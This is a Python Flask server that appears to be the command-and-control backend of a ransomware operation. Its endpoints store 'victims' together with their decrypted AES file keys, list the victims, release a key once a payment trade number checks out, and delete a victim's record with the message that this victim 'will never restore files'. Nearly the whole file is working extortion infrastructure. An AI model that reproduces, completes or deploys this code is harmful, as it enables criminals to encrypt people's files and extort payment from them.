import uuid
from utils import decrypt_key, check_trade
from flask import Flask, jsonify, request
from flask_cors import CORS
from db import victims
import time
from base64 import b64decode,b64encode

V = victims()

# configuration
DEBUG = True

# instantiate the app
app = Flask(__name__)
app.config.from_object(__name__)

# enable CORS
CORS(app, resources={r'/*': {'origins': '*'}})

# def remove_victim(victim_id):
#     for victim in V.vicList:
#         if victim['id'] == victim_id:
#             V.vicList.remove(victim)
#             return True
#     return False


# sanity check route
# @app.route('/ping', methods=['GET'])
# def ping_pong():
#     return jsonify('pong!')


@app.route('/victims', methods=['GET'])
def all_victims():
    response = {'status': 'success'}
    response['victims'] = V.vicList
    return jsonify(response)

@app.route('/victims/add', methods=['POST'])
def add_victim():
    if not request.is_json:
        return '400 Not Json'
    post_data = request.get_json()
    keys = list(post_data.keys())
    response = dict()
    if 'id' in keys and 'aes_key' in keys:
        try:
            V.new_victim(vid=post_data.get('id'), pkey=decrypt_key(post_data.get('aes_key')))
            # print(type(post_data.get('aes_key')))
            # print(post_data.get('aes_key'))
            V.vicList.append({
                    # 'id': uuid.uuid4().hex,
                    'id': post_data.get('id'),
                    'inf_time': time.ctime(),
                    'ransom': post_data.get('ransom', False),
                    'aes_key': decrypt_key(post_data.get('aes_key'))
                })
            response['status'] = 'success'
            response['message'] = 'Victim added!'
        except: pass
    else:
        response['message'] = 'Failure to add victim!'
    return jsonify(response)


@app.route('/victims/<victim_id>', methods=['POST', 'DELETE'])
def update_victim(victim_id):
    # if not request.is_json:
    #     return '400 Not Json'
    post_data = request.get_json()
    response = dict()
    if request.method == 'DELETE':
        if V.rm_victim(victim_id):
            response['message'] = 'This victim will never restore files'
        else:
            response['message'] = 'No such victim'
    else:
        keys = list(post_data.keys())
        if keys == ['id', 'aes_key', 'ransom', 'out_trade_no']:
            if check_trade(post_data.get('out_trade_no')):
                response['status'] = 'success'
                k = V.paid(victim_id)
                response['id'] = post_data.get('id')
                response['message'] = 'Promise is debt! Your files are intact.'
                response['aes_key'] = k
        else:
            response['status'] = 'failure'
            response['id'] = post_data.get('id', None)
    # else:
    #     response['message'] = 'Do not play tricks!'
    return jsonify(response)


# @app.route('/victims/<victim_id>', methods=['PUT', 'DELETE'])
# def single_victim(victim_id):
#     response = {'status': 'success'}
#     if request.method == 'PUT':
#         post_data = request.get_json()
#         response['post_data'] = post_data
#         remove_victim(victim_id)
#         VICTIMS.append({
#             # 'id': uuid.uuid4().hex,
#             'id': post_data.get('victim_id'),
#             'aes_key': post_data.get('aes_key'),
#             'paid': post_data.get('paid')
#         })
#         response['message'] = 'Victim updated!'
#     if request.method == 'DELETE':
#         response['id'] = victim_id
#         if remove_victim(victim_id):
#             response['message'] = 'Victim removed!'
#         else:
#             response['status'] = 'False'
#             response['message'] = 'Victim failed!'
#     return jsonify(response)


if __name__ == '__main__':
    app.run()